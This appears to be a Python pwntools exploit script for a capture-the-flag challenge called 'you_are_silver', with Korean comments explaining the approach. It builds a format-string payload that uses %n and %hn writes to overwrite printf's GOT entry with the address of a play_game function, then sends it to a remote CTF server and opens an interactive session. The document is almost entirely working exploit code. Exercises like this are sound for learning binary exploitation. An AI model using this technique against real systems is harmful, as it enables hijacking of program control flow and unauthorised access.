from pwn import *

'''
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
'''

context(arch="amd64", os='linux')
e = ELF('./you_are_silver')

r = remote("ctf.j0n9hyun.xyz", 3022)

# fsb 존재함
# 6번째 부터 입력 포맷.
# 64bit fsb는 주소값에 null이 들어있어 주소를 뒷 편에 써야한다
# 그래서 payload를 8byte로 맞춰주고 나니 9, 10번째 인자로 주소가 들어간다.
play_game = 0x4006d7

printf = p64(e.plt['printf'])
printf_got = p64(e.got['printf'])
printf_got_2 = p64(e.got['printf']+2)
print(hex(e.got['printf']))

payload  = bytes("%{}c".format(0x40), "utf-8")+b"%9$n"
payload += bytes("%{}c".format(0x6d7 - 0x40), "utf-8")+b"%10$hn"
payload += b"AAAA"
payload += printf_got_2+printf_got
payload += b"z"*(46-len(payload))
print(payload)

r.send(payload)

r.interactive()
